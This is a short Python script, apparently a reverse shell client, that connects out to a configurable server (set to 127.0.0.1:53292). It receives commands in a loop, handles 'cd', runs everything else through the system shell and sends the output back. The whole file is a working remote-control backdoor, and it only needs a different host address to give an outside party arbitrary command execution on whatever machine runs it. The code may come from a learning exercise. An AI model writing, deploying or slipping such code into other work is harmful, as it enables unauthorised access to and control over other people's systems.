import socket
import struct
import sys
import os
import subprocess

# client needs to execute this to connect to the server
# run the client with `python reverseShellClient.py` after the server is listeing
# The server's hostname or IP address
HOST = '127.0.0.1'
PORT = 53292        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print("sending data to server")
    s.sendall(b'Hello! I am pinging you!')
    print("data sent, waiting for response...")
    while True:
        print("Receiving data... ")
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd": #encoding the commands
        #    pwd = os.getcwd()
        #    os.chdir(os.path.join(pwd, data[3:].decode("utf-8")))
            try:
                os.chdir(data[3:].decode("utf-8"))
            except FileNotFoundError:
                print("directory or file non existing. Ignoring the command.")
            finally:
                pass
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            byte_output = cmd.stdout.read() + cmd.stderr.read()
            str_output = str(byte_output, "utf-8")
            s.send(str.encode(str_output + str(os.getcwd())+ "> "))
            print(str_output)
    s.close()
